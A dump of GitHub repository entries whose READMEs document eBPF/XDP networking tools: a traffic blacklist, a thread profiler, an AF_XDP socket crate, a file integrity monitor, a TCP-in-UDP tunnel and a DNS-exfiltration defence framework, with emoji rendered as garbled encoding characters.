You can ban or allow traffic based on:

- Blocking based on a specific **Source IP** (SIP)
- Blocking based on a specific **Destination IP** (DIP)
- Blocking based on a specific **Sourceâ€“Destination IP pair**
- Blocking based on a **three-tuple** (Source IP, Destination IP, Port), e.g., blocking a specific SSH connection
- Blocking based on a specific **Port** (e.g., port 22)
- Blocking traffic on a specific **Network Interface**

---
## ðŸ›  Building the Project

To compile all components, simply run:

```bash
make
```

The compiled binaries and object files will be placed under the `build/` directory:

- `build/blacklist.o` â€“ the XDP object file
- `build/blacklist_config_writer` â€“ the configuration generator
- `build/blacklist_map` â€“ the eBPF map loader

---

## ðŸš€ Running the Program

Use the provided run script to start everything:

```bash
bash /scripts/run_blacklist.sh
```

The script will:
1. Ask you to enter the **network interface name** (e.g., `enp0s1`)
2. Load the compiled XDP program onto the selected interface
3. Execute `blacklist_config_writer` to generate a config
4. Load values into eBPF maps using `blacklist_map`

> **Note:** The script requires `sudo` privileges to attach the XDP program and access system resources.

---
## ðŸ“¦ Requirements

- Clang / LLVM (for compiling the XDP program)
- libbpf-dev
- libjansson-dev
- GCC
- Linux kernel with eBPF/XDP support

### Debian / Ubuntu

```bash
sudo apt update
sudo apt install clang llvm gcc libbpf-dev libxdp-dev xdp-tools bpftool linux-headers-$(uname -r) libjansson-dev
```

### RHEL / CentOS / Fedora

```bash
sudo dnf install clang llvm gcc libbpf libbpf-devel libxdp libxdp-devel xdp-tools bpftool kernel-headers
```

To install **libjansson** on RHEL-based systems, enable EPEL repository and then install:

```bash
sudo dnf install epel-release
sudo dnf install jansson-devel
```
---
"
clickpost-ai/thread_profiling,2,0,2,0,Python,,2025-07-02T05:08:56Z,2025-08-27T11:46:19Z,20,"# eBPF Thread Profiler

A production-ready eBPF profiler that monitors application performance through kernel syscall correlation, providing insights into queue depth, thread utilization, and response times **without any application instrumentation**.

## Key Innovation: Syscall Correlation

This profiler works by correlating Linux syscalls to understand application behavior at the kernel level:

```
accept4() â†’ epoll_ctl() â†’ ioctl() â†’ recvfrom() â†’ sendto()
    â†“           â†“          â†“         â†“           â†“
Connection   Event      Setup    Request    Response
Accept      Register   NonBlk    Start      Complete
```

By tracking this syscall sequence for each file descriptor, we derive application-level metrics:
- **Queue Depth**: Connections accepted but not yet processed
- **Thread Utilization**: Active worker threads in thread pools  
- **Response Times**: End-to-end request processing latency
- **Lock Contention**: Mutex wait times via pthread_mutex_lock profiling
- **I/O Wait**: Time spent waiting for network/disk operations
- **Lock Latency**: Detailed analysis of mutex blocking patterns

## Multi-Language Support

Works with **any application** using standard Linux networking syscalls:
- **Java**: Jetty, Tomcat, Spring Boot applications
- **Python**: Django, Flask, FastAPI web servers
- **Node.js, Go, Rust**: Any HTTP server implementation
- **Zero application code changes** required

## Production Impact

Deployed in production at Clickpost for 18+ months:
- **40% reduction** in server instances through better resource utilization
- **Early detection** of performance bottlenecks before service degradation  
- **Real-time queue monitoring** enabling automated scaling decisions
- **Cost savings** through optimized resource usage

Read more: [How We Scaled Servers While Reducing Cloud Costs Using eBPF](https://www.clickpost.ai/blog/scaled-servers-while-curtailing-our-cloud-costs-using-ebpf)

## Installation

### Prerequisites
- Linux system with BPF support (kernel 4.1+)
- Root privileges for eBPF program loading
- BCC (BPF Compiler Collection)

### Amazon Linux 2
```bash
sudo amazon-linux-extras install BCC -y
```

### Other Distributions
Follow the [BCC Installation Guide](https://github.com/iovisor/bcc/blob/master/INSTALL.md)

## Usage

### Java Application Monitoring
```bash
sudo python3 java_thread_profiling.py -e production -p 1234,1235
```

### Python Application Monitoring  
```bash
sudo python3 python_thread_profiling.py -e production -p 5678,5679
```

### Parameters
- `-e, --env`: Environment name for organizing monitoring sessions
- `-p, --pid`: Comma-separated list of process IDs to monitor

## Example Output

```
Request Queue Depth: 45 requests
Thread Pool Usage: 78.5% (157/200 threads active)
Average Response Time: 245ms
Lock Latency: 12.3ms average mutex wait time
I/O Wait Time: 89ms per request

Performance Metrics:
- accept4(): 1,240 calls/sec (connection handling)
- recvfrom(): 1,180 calls/sec (request processing)  
- sendto(): 1,165 calls/sec (response delivery)
- pthread_mutex_lock: 2,340 calls with 8.7ms avg contention

Detailed Lock Analysis:
- Total lock time: 15.2 seconds over measurement period
- Lock contention events: 234 blocking occurrences
- Critical section analysis: Database operations show highest mutex wait
```

## How It Works

### eBPF Implementation
- **Syscall tracepoints** on accept4, epoll_ctl, ioctl, recvfrom, sendto
- **Uprobe/uretprobe** on pthread_mutex_lock for lock contention analysis
- **Kprobe** on finish_task_switch for I/O wait measurement
- **Hash tables** for file descriptor tracking and correlation
- **Atomic counters** for thread-safe metrics collection
- **Real-time data export** to monitoring systems

### Syscall Correlation Logic
1. **accept4()** - Track incoming connections, increment queue depth
2. **epoll_ctl()** - Monitor event loop registration patterns  
3. **ioctl()** - Detect non-blocking socket configuration
4. **recvfrom()** - Mark request processing start, decrement queue
5. **sendto()** - Calculate end-to-end response time

### Lock Contention Analysis
- **pthread_mutex_lock** uprobe - Entry point timing
- **pthread_mutex_lock** uretprobe - Exit point timing  
- **Mutex wait calculation** - Difference between entry/exit timestamps
- **Per-thread lock analysis** - Individual thread blocking patterns

### I/O Wait Monitoring
- **finish_task_switch** kprobe - Context switch detection
- **Process scheduling analysis** - Time spent off-CPU
- **I/O blocking identification** - Network and disk wait patterns

### Production Architecture
```
Application â†’ Kernel Syscalls â†’ eBPF Probes â†’ Metrics Collection â†’ Elasticsearch/Monitoring
```

## Use Cases

- **Performance bottleneck identification** at the kernel level
- **Capacity planning** based on real thread utilization
- **Automated scaling** triggered by queue depth thresholds
- **Production debugging** without application instrumentation
- **Cost optimization** through precise resource monitoring

## Contributing

Contributions welcome! This tool is actively used in production and benefits from community feedback.

## License

MIT License - see LICENSE file for details.

---

**Note**: Requires root privileges for eBPF program loading. Designed for production use with minimal overhead.
"
sudachen/xdp-rs,10,1,10,0,Rust,Simple and clear Rust implementation of the Af_XDP socket and XDP helpers.,2025-06-27T08:22:07Z,2025-08-07T09:25:55Z,43,"## XDP-Socket

[![crates.io](https://img.shields.io/crates/v/xdp-socket.svg)](https://crates.io/crates/xdp-socket)
[![Documentation](https://docs.rs/xdp-socket/badge.svg)](https://docs.rs/xdp-socket)

This crate provides a simple and transparent Rust implementation of AF_XDP sockets. It is designed for applications that require direct, high-performance access to network interfaces, bypassing the kernel's networking stack to minimize syscalls and scheduler overhead.

The core design philosophy is a minimalistic API, making it a flexible building block for integration with modern asynchronous ecosystems like tokio, mio, and quinn.

The primary motivation for xdp-socket is to provide a networking foundation for building low-latency and high-throughput applications, with a particular focus on real-time Web3 infrastructure, such as:

 - Peer-to-peer (P2P) data propagation layers

 - High-performance RPC gateways

 - Real-time indexing services

## API Design

There are two main socket types: `TxSocket` for sending (transmitting) data and `RxSocket` for receiving data. A bidirectional socket is handled as a pair of `TxSocket` and `RxSocket`.

Instead of a basic `send`/`recv` model, the main API uses a `seek`/`peek`/`commit` workflow. This gives you direct control over memory and how packets are handled. The behavior of these functions changes depending on whether you are sending or receiving.

#### Sending with `TxSocket` âž¡ï¸
1.  **`seek`**: Finds an empty memory frame available for you to write a packet into.
2.  **`peek`**: Gets a writable buffer for that frame.
3.  **`commit`**: Submits the written buffer to the network driver to be sent.

#### Receiving with `RxSocket` â¬…ï¸
1.  **`seek`**: Finds a frame that has already received a packet from the network.
2.  **`peek`**: Gets a readable buffer so you can process the packet's data.
3.  **`commit`**: Releases the frame, allowing it to be reused for receiving new packets.

A batching API (`seek_n`, `peek_at`, `commit_n`) is also available for both sending and receiving, which allows you to process multiple frames at once for better efficiency.

## Performance

This API allows an application to run on an isolated CPU core without yielding to the scheduler. By avoiding these context switches, it achieves the high performance and low latency needed for heavy-load applications.

# Usage

First, add `xdp-socket` to your `Cargo.toml` dependencies:

```toml
[dependencies]
xdp-socket = ""0.1"" # Replace with the latest version
```

Here is a basic example of how to create a `TxSocket` and send a UDP packet:

```rust
let mut sok = xdp_socket::create_tx_socket(if_index, 0, None)
    .map_err(|e| io::Error::other(format!(""Failed to create XDP socket: {e}"")))?;

let mut buffer = sok.seek_and_peek(raw_packet_bytes_len).map_err(|e|
    io::Error::other(format!(""Failed to seek and peek: {e}"")))?;

// ... write packet data into the buffer here ...

sok.commit_and_kick(1).map_err(|e| 
    io::Error::other( format!(""Failed to commit buffer in RX ring: {e}"")))?;
```

## Safety

This crate is inherently `unsafe` because creating and managing AF_XDP sockets requires direct interaction with the Linux kernel through low-level APIs (`libc`). The caller is responsible for ensuring:

1.  The application has the necessary capabilities (e.g., `CAP_NET_ADMIN`, `CAP_NET_RAW`, `CAP_BPF`) to create AF_XDP sockets.
2.  The provided network interface index and queue ID are valid.
3.  Memory is handled correctly, although the library provides safe abstractions where possible.


## Requirements

XDP-Socket requires a Linux kernel version of 5.10 or later.
To build this crate, you'll need to have a libelf-dev, libbpf-dev, gcc-mulilib and linux-headers installed.

```sh
sudo apt-get install libelf-dev libbpf-dev gcc-mulilib linux-headers-$(uname -r)
```

## License

Licensed under either of the [MIT License](LICENSE-MIT) or the [Apache License, Version 2.0](LICENSE-APACHE) at your discretion. This project is dual-licensed to be compatible with the Rust project's licensing scheme and to give users maximum flexibility.

### Contribution

Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion in the work by you, as defined in the Apache-2.0 license, shall be dual-licensed as above, without any additional terms or conditions."
0Bharat9/file_integerity_monitoring,10,1,10,0,C,,2025-04-27T09:12:12Z,2025-07-27T03:38:23Z,32,"<div align=""center"">

# ðŸ›¡ï¸ FIM - File Integrity Monitoring

### **Real-time File System Monitoring with eBPF Technology**

[![Linux](https://img.shields.io/badge/Platform-Linux-green.svg)](https://kernel.org)
[![eBPF](https://img.shields.io/badge/Powered_by-eBPF-orange.svg)](https://ebpf.io)
[![C](https://img.shields.io/badge/Language-C-lightgrey.svg)](<https://en.wikipedia.org/wiki/C_(programming_language)>)
[![Kernel](https://img.shields.io/badge/Kernel-5.8+-red.svg)](https://kernel.org)

**High-performance, kernel-space file integrity monitoring system leveraging eBPF for real-time security monitoring with minimal overhead.**

[ðŸš€ Quick Start](#-quick-start) â€¢ [ðŸ“– Features](#-key-features) â€¢ [âš¡ Performance](#-performance) â€¢ [ðŸ› ï¸ Installation](#-installation) â€¢ [ðŸ“Š Examples](#-usage-examples)

</div>

## ðŸŒŸ **Why FIM?**

<div align=""center"">

|                  ðŸš€ **High Performance**                   |                   ðŸ›¡ï¸ **Security First**                   |       ðŸŽ¯ **Precision Monitoring**       |
| :--------------------------------------------------------: | :-------------------------------------------------------: | :-------------------------------------: |
| eBPF kernel-space monitoring<br/>**~minimal CPU overhead** | Real-time threat detection<br/>**Content-aware analysis** | Smart filtering & pattern matching<br/> |

</div>

---

## âœ¨ **Key Features**

### ðŸ” **Core Monitoring Capabilities**

- **âš¡ Real-time Events**: Monitor file creation, deletion, modification, symlink creation and permission changes with microsecond precision
- **ðŸ§  Content-Aware**: Hash-based verification to detect actual content changes
- **ðŸ‘¤ Process Context**: Track which processes are making file system changes
- **ðŸ” User Attribution**: Monitor file operations by specific users or system-wide

### ðŸŽ›ï¸ **Advanced Filtering Engine**

- **ðŸŽ¯ Pattern Matching**: Include/exclude files based on glob patterns
- **ðŸ§¹ Noise Reduction**: Intelligent filtering of temporary files and editor artifacts
- **ðŸ“ Path Controls**: Exclude specific directories or file types
- **âš™ï¸ Process Filtering**: Monitor specific processes or exclude system noise

### ðŸ“Š **Rich Output & Logging**

- **ðŸ“‹ JSON Logging**: Structured logging with detailed event metadata
- **ðŸ“º Live Display**: Real-time monitoring with configurable output formats
- **ðŸ“ˆ Metadata Capture**: File permissions, ownership, size, and timestamps
- **ðŸ·ï¸ Event Classification**: Categorize events by type (CREATE, DELETE, WRITE, RENAME/MOVE, SYMLINK, CHMOD, CHOWN)

### âš¡ **Performance Optimized**

- **ðŸš€ eBPF Integration**: Minimal overhead monitoring directly in kernel space
- **ðŸ’¾ Smart Caching**: Avoid redundant checks for unchanged files
- **ðŸŽšï¸ Selective Monitoring**: Configure exactly what events to capture

---

## ðŸ—ï¸ **Architecture Overview**

<div align=""center"">

```mermaid
graph TB
    subgraph ""Kernel Space""
        A[eBPF Program] --> B[File System Events]
        B --> C[Event Filter]
    end

    subgraph ""User Space""
        C --> D[Event Handler]
        D --> E[Path Resolution]
        D --> F[Content Analysis]
        D --> G[JSON Logger]
        E --> H[Live Display]
        F --> H
        G --> I[Log Files]
    end

    style A fill:#ff6b6b
    style H fill:#4ecdc4
    style I fill:#45b7d1
```

</div>

### ðŸ§© **Core Components**

| Component                  | Description               | Purpose                                        |
| -------------------------- | ------------------------- | ---------------------------------------------- |
| **ðŸ”§ eBPF Kernel Program** | Runs in kernel space      | Capture file system events with zero overhead  |
| **âš¡ Event Handler**       | Process and filter events | Apply intelligent filtering and categorization |
| **ðŸ—‚ï¸ Path Resolution**     | Resolve file paths        | Handle complex directory structures            |
| **ðŸ“Š JSON Logger**         | Structured logging        | Comprehensive event metadata storage           |
| **ðŸ” File Monitor**        | Content analysis          | Hash-based change detection                    |
| **ðŸ’» System Info**         | Context capture           | System metadata (hostname, user, network)      |

---

## ðŸ› ï¸ **Installation**

### ðŸ“‹ **Prerequisites**

<details>
<summary><b>ðŸ§ System Requirements</b></summary>

- Linux kernel **5.8+** with eBPF support
- Root privileges (required for eBPF program loading)
- BTF (BPF Type Format) support in kernel

</details>

<details>
<summary><b>ðŸ“¦ Dependencies Installation</b></summary>

**Ubuntu/Debian:**

```bash
sudo apt update && sudo apt install -y \
    libbpf-dev libelf-dev zlib1g-dev libssl-dev \
    linux-tools-common linux-tools-$(uname -r) \
    clang gcc linux-headers-$(uname -r) pkg-config
```

**RHEL/CentOS/Fedora:**

```bash
sudo dnf install -y \
    libbpf-devel elfutils-libelf-devel zlib-devel \
    openssl-devel clang gcc kernel-devel pkg-config
# For bpftool (may need to build from source on some versions)
sudo dnf install -y bpftool || echo ""bpftool not available via package manager""
```

</details>

### ðŸš€ **Quick Installation**

```bash
# 1ï¸âƒ£ Clone the repository
git clone https://github.com/your-username/fim.git
cd fim

# 2ï¸âƒ£ Verify dependencies
make check-deps

# 3ï¸âƒ£ Build FIM
make

# 4ï¸âƒ£ Install system-wide (optional)
sudo make install
```

### ðŸŽ¯ **Build Options**

| Command           | Description              |
| ----------------- | ------------------------ |
| `make`            | ðŸ”¨ Standard build        |
| `make clean`      | ðŸ§¹ Clean build artifacts |
| `make check-deps` | âœ… Verify dependencies   |

---

## ðŸš€ **Quick Start**

```bash
# ðŸ” Basic monitoring (requires root)
sudo ./fim

# ðŸ“Š Verbose output with timestamps
sudo ./fim --verbose --timestamp

# ðŸŽ¯ Monitor specific directories
sudo ./fim --watch ""/etc/*"" --watch ""/home/user/*""

# ðŸ§¹ Filter out noise
sudo ./fim --exclude-tmp-files --exclude-editor-noise
```

---

## ðŸ“š **Usage Examples**

### ðŸ›¡ï¸ **Security Monitoring**

```bash
# Monitor critical system directories
sudo ./fim --watch ""/etc/*"" --watch ""/usr/bin/*"" --watch ""/usr/sbin/*"" \
           --content-aware --enable-logging --timestamp
```

### ðŸ‘¨â€ðŸ’» **Development Environment**

```bash
# Monitor project with noise reduction
sudo ./fim --watch ""/path/to/project/*"" \
           --exclude-tmp-files --exclude-editor-noise \
           --ignore-unchanged --verbose
```

### ðŸ“‹ **Compliance & Auditing**

```bash
# Comprehensive monitoring with logging
sudo ./fim --monitor-create --monitor-delete --monitor-write \
           --content-aware --enable-logging --timestamp --print-uid
```

### ðŸ”§ **Configuration Options**

<details>
<summary><b>âš™ï¸ Monitoring Control</b></summary>

- `--monitor-create` - Monitor file creation events
- `--monitor-delete` - Monitor file deletion events
- `--monitor-write` - Monitor file write/modification events
- `--strict-watch` - Only monitor explicitly specified patterns

</details>

<details>
<summary><b>ðŸŽ›ï¸ Filtering Options</b></summary>

- `--exclude <pattern>` - Exclude files matching pattern
- `--watch <pattern>` - Only monitor files matching pattern
- `--exclude-tmp-files` - Skip temporary files
- `--exclude-editor-noise` - Filter editor temporary files
- `--exclude-dev-null` - Skip /dev/null operations

</details>

<details>
<summary><b>ðŸ“Š Output Options</b></summary>

- `--verbose` - Detailed event information
- `--timestamp` - Include event timestamps
- `--print-uid` - Show user IDs
- `--enable-logging` - Write events to `/var/log/fim.log`
- `--show-flags` - Display file operation flags
</details>

---

## ðŸ“Š **Output Formats**

### ðŸ“‹ **JSON Log Format**

```json
{
  ""account"": ""root"",
  ""asset"": ""test-ubuntu"",
  ""asset_address"": ""192.168.17.148"",
  ""asset_os_family"": ""linux"",
  ""file_event"": ""other"",
  ""file_extension"": ""log"",
  ""file_name"": ""audit.log"",
  ""file_owner"": ""root"",
  ""file_path"": ""/var/log/audit/audit.log"",
  ""file_permissions"": ""rw-r-----"",
  ""file_size"": 2039,
  ""process"": ""auditd"",
  ""process_id"": ""750"",
  ""process_path"": ""/usr/sbin/auditd"",
  ""process_user"": ""root"",
  ""timestamp"": ""2025-07-08T15:20:16.000Z"",
  ""user"": ""root""
}
```

---

## âš¡ **Performance**

<div align=""center"">

| Metric                | Performance                                |
| --------------------- | ------------------------------------------ |
| **ðŸ”¥ CPU Overhead**   | ~1-3% in typical scenarios                 |
| **ðŸ’¾ Memory Usage**   | Efficient caching with configurable limits |
| **ðŸ’½ Storage Impact** | Zero additional I/O for monitoring         |
| **ðŸ“ˆ Scalability**    | Handles high-volume operations efficiently |

</div>

---

## ðŸ”’ **Security Considerations**

| âš ï¸ **Security Notes**                                 |
| ----------------------------------------------------- |
| â€¢ Requires root privileges for eBPF program loading   |
| â€¢ Monitor access to the FIM binary and configuration  |
| â€¢ Log files contain sensitive file system information |

---

## ðŸ› **Troubleshooting**

<details>
<summary><b>âŒ Common Issues</b></summary>

| Issue                           | Solution                                        |
| ------------------------------- | ----------------------------------------------- |
| **Permission Denied**           | Ensure running with root privileges             |
| **eBPF Program Loading Failed** | Verify kernel eBPF support and BTF availability |
| **Missing Dependencies**        | Run `make check-deps` to verify installation    |

</details>

<details>
<summary><b>ðŸ”§ Debug Mode</b></summary>

```bash
# Build and run in debug mode
make debug
sudo ./fim --verbose
```

</details>

---
"
matttbe/tcp-in-udp,69,5,69,0,C,Lightweight TCP in UDP tunnel ðŸš‡ using eBPF ðŸ,2025-04-17T16:52:58Z,2025-10-03T16:08:17Z,42,"# TCP in UDP

Middleboxes can mess up with TCP flows, e.g. intercepting the connections and
dropping MPTCP options. Using an TCP-in-UDP tunnel will force such middleboxes
not to modify such TCP connections. The idea here is inspired by an old [IETF
draft](https://datatracker.ietf.org/doc/html/draft-cheshire-tcp-over-udp-00.html).

This ""tunnel"" is done in eBPF, from the TC hooks. For more details about why it
has been created, and its particularities, please check this
[blog post](https://blog.mptcp.dev/2025/07/14/TCP-in-UDP.html).

## Headers

[UDP](https://www.ietf.org/rfc/rfc768.html):

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            Length             |           Checksum            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

[TCP](https://www.ietf.org/rfc/rfc9293.html):

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Data |       |C|E|U|A|P|R|S|F|                               |
| Offset| Reser |R|C|R|C|S|S|Y|I|            Window             |
|       |       |W|E|G|K|H|T|N|N|                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Checksum            |         Urgent Pointer        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      (Optional) Options                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

[TCP-in-UDP](https://datatracker.ietf.org/doc/html/draft-cheshire-tcp-over-udp-00.html):

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            Length             |           Checksum            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Data |       |C|E| |A|P|R|S|F|                               |
| Offset| Reser |R|C|0|C|S|S|Y|I|            Window             |
|       |       |W|E| |K|H|T|N|N|                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      (Optional) Options                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

Modifications:
- `URG` set to 0, `Urgent Pointer` is supposed to be zero (not used).
- Switch `Sequence Number` and `Acknowledgment Number` with `Urgent Pointer` and
  `Checksum`.
- Replace `Urgent Pointer` by the `Length`: Checksum needs to be recomputed.

Checksum:
- No need to recompute it from scratch, it can be derived from the previous
  values, by just changing the protocol.

- [UDP Checksum](https://www.rfc-editor.org/rfc/rfc768) computed from:
  - Source and destination address: from upper layer
  - Protocol (1B): UDP (17)
  - Length (2B): Data (variable) + UDP header (8 octets) lengths
  - TCP header
  - Data

- [TCP Checksum](https://www.ietf.org/rfc/rfc9293.html#section-3.1-6.18.1)
  computed from:
  - Source and destination address: from upper layer
  - Protocol (1B): TCP (6)
  - Length (2B): Data (variable) + TCP header (Between 20 and 56 octets) lengths
  - TCP header
  - Data

- Differences:
  - Source and destination address: not changed
  - Protocol: **changed**: UDP/TCP.
  - Data length: not changed
  - L4 header: **changed**: `UDP Length` vs `TCP Urgent Pointer`
  - Data: not changed


## Build

Build the binary using `make`. CLang, `libelf`, `libc6`, and `libbpf` are
required:

```
sudo apt install make clang libelf-dev libc6-dev-i386 libbpf-dev
```


## Setup

Load it with `tc` commands:

- Client:
  ```
  tc qdisc add dev ""${IFACE}"" clsact
  tc filter add dev ""${IFACE}"" egress  u32 match ip dport ""${PORT}"" 0xffff action goto chain 1
  tc filter add dev ""${IFACE}"" egress  chain 1 bpf object-file tcp_in_udp_tc.o section tc action csum udp
  tc filter add dev ""${IFACE}"" ingress u32 match ip sport ""${PORT}"" 0xffff action goto chain 1
  tc filter add dev ""${IFACE}"" ingress chain 1 bpf object-file tcp_in_udp_tc.o section tc direct-action
  ```
- Server:
  ```
  tc qdisc add dev ""${IFACE}"" clsact
  tc filter add dev ""${IFACE}"" egress  u32 match ip sport ""${PORT}"" 0xffff action goto chain 1
  tc filter add dev ""${IFACE}"" egress  chain 1 bpf object-file tcp_in_udp_tc.o section tc action csum udp
  tc filter add dev ""${IFACE}"" ingress u32 match ip dport ""${PORT}"" 0xffff action goto chain 1
  tc filter add dev ""${IFACE}"" ingress chain 1 bpf object-file tcp_in_udp_tc.o section tc direct-action
  ```

On layer 3 interfaces, use the ELF section called `tc_l3`.

Multiple u32 filters can be used to have more than one port traffic sent to the
BPF program.

If the TCP program supports setting marks (`SO_MARK`), use it for egress to
prevent processing traffic that is not from the TCP program. For client, this
allows traffic to a different IP address with the same TCP port. For server,
this prevents sending packet to BPF program if the interface has multiple IP
addresses assigned and if the TCP program doesn't bind to all of them.

- Client & Server:
  ```
  tc filter add dev ""${IFACE}"" egress  handle 2 fw action goto chain 1
  ```

Be warned that `SO_MARK` can't be used for ingress as the system doesn't expect
incoming UDP packets. Therefore, all incoming packets from the interface with
matching port will be sent to the BPF program. To decrease the chance of this
happening, you're recommended to use ports that are outside the ephemeral port
range set on `net.ipv4.ip_local_port_range` (default: 32768-60999). This option
applies to IPv6 too.

Generic Segmentation Offload (GSO) and Generic Receive Offload (GRO) cannot be
used for this traffic, because each UDP packet will carry a part of the TCP
headers as part of the data. This part of the data is specific to one packet,
therefore, it cannot be merged with the next data. UDP GRO is only done on
demand, e.g. when the userspace asks it (`setsockopt(IPPROTO_UDP, UDP_GRO)`) or
for some in-kernel tunnels, so GRO doesn't need to be disabled. To disable GSO:

```
ip link set ${IFACE} gso_max_segs 0
```

Note: to get some stats, in egress, it is possible to use:

```
tc -s action show action csum
tc -s -j action show action csum | jq
```

It might be interesting to monitor the tracing ring buffer for warnings and
other messages generated by the eBPF program:

```
cat /sys/kernel/debug/tracing/trace_pipe
```

To stop the eBPF program:

```
tc filter del dev ""${IFACE}"" egress
tc filter del dev ""${IFACE}"" ingress
```

## MSS

Because the packets will be in UDP and not TCP, any MSS clamping will have no
effects here. It is important to avoid IP fragmentation. In other words, it
might be required to adapt the MTU (or the MSS).
"
Synarcs/DNSObelisk,30,1,30,3,Go,"Advanced kernel-native security framework to disrupt and prevent DNS-based breaches including C2 channels and tunneling with zero data loss. Combines TC, Netfilter, raw socket interception, BPF maps, and ring buffers, runs entirely on eBPF in the Linux kernel. Integrates with  deep learning for advanced intelligent EDR",2024-02-16T19:36:26Z,2025-08-30T23:10:03Z,372,"<p align=""center"">
  <img src=""docs/logo.jpg"" width=""300"" height=""290"">
</p>


# DNS Data Exfiltration Security 
Enhanced observability and security solution built for enterprises to fully prevent DNS base exfiltration (C2, tunnelling, raw) with negligible data loss robust metrics, observability and tracing for malicious exfiltration attempts. Framework build for modern distributed cloud environments. orchestrated environments. High security running Deep Packet inspection directly inside Linux Kernel to prevent every DNS exfiltrated packet to passthrough. Runs eBPF across complete kernel network stack (TC, XDP, SOCK, SYSCALL), to prevent any exfiltration from host net_device to virtual encapsulated kernel traffic. Uses Deep learning in userspace and kafka data streaming and event analytics ensuring dynamic threat mitigation for both cloud-native build DNS infrastructures and legacy DNS topologies. Highly robust in preventing against DGA, safeguarding enterprises from any form of exfiltration happening via DNS. Proposes cloud-native DNS topologies for high security in preventing any type of exfiltration from DNS also ensuring HA with both peak performance and security. Introduces novel approach referred as kernel enforced dynamic security for endpoint detection and response a wrapper to aid enterpirse EDR / XDR solutions with dynamic network policies, network filters, cloud infrastructure NACL's for cross protocol exfiltration prevention (l3, l4, l7) once prevented via DNS.


# Vision
Introduces a novel approach termed Kernel-Enforced Dynamic Security (KEDS) for Endpoint Detection and Response (XDR / EDR), acting as a wrapper to enhance enterprise EDR/XDR solutions.
KEDS provides real-time, kernel-level enforcement of dynamic network policies, fine-grained traffic filters, and cloud infrastructure NACLs to prevent cross-protocol exfiltration across layers L3 (IP), L4 (Transport), and L7 (Application) â€” especially effective following initial prevention at the DNS layer.


## Node Agent

Kernel 
* Kernel NEtwork Stack
    * XDP
    * Traffic Control  (CLSACT)
    * Kernel Probes
    * Kernel Functions
    * Raw Tracepoints (kernel schedulers, software netdev device drivers)
    * Kernel Socket layer (cgroup_egress)
    * Kernel LSM (BPF Security Hooks BPF_PROG_LOAD, secured sign verification)
* eBPF dynamic advanced maps and tracing for malicious events
    * BPF_MAP_TYPE_LRU_HASH
    * BPF_MAP_TYPE_RINGBUF
    * BPF_MAP_TYPE_HASH
    * BPF_MAP_TYPE_LPM_TRIE
    * BPF_MAP_TYPE_ARRAY


UserLand 
* Cilium eBPF 
* Cilium CNI 
* Kafka Streams Producers
* Deep Learning
    * ONNX (Open Neural Network Exchange)
    * ONNX Model Quantization
    * Tensorflow
    * Dense Neural Networks
* GRPC over UDS - ONNX Inference RPC servers 
* Filter Chain Proxies for Segmented DPI
    * Envoy L7 Proxy, Custom L7 Filter chains paired with kernel sock parser eBPF DPI

## Distributed Infrastructure
DNS Network Topologies
* PowerDNS
* PowerDNS Authoritative Server
* PowerDNS Recursor 
* Apache Kafka
* Apache Kafka Schema Registry


## Control Plane 
Threat Event Stream Message Analysis Control Plane Server 
* Apache Kafka (Producer, Consumer)
* Spring Kafka 
* Spring 
* Hibernate Spring JPA



## The framework Capabilities
* Severing C2 channels on creation. 
* Exposing C2 implants / APT malwares carrying DNS data exfiltration.
* Destroying DNS tunnels carrying exfiltration of any protocol over DNS.
* Destroying DNS tunnels and C2 channels carrying exfiltration of any protocol over DNS through any port irrespective of UDP transport
* Destroying tunnels in tunnels and reverse forwarded tunnels on compromised machines further tunnelled through DNS for remote C2 communication.
